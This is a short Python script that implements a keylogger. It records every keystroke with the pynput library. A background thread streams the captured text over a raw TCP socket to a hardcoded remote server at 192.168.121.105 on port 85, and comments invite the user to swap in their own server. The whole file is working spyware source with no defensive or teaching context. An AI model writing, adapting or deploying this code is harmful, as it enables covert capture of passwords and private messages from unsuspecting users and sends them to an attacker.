import socket
from pynput import keyboard
from threading import Thread

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

def send_logs(ip, port):
    global log
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    while True:
        if log:
            sock.sendall(log.encode())
            log = ""

def start_logging(ip, port):
    listener = keyboard.Listener(on_press=on_press)
    with listener:
        t = Thread(target=send_logs, args=(ip, port))
        t.start()
        listener.join()

if __name__ == "__main__":
    IP_ADDRESS = "192.168.121.105" ################## Change it to the server ip
    PORT = 85                      ################## Change it to the server port
    start_logging(IP_ADDRESS, PORT)
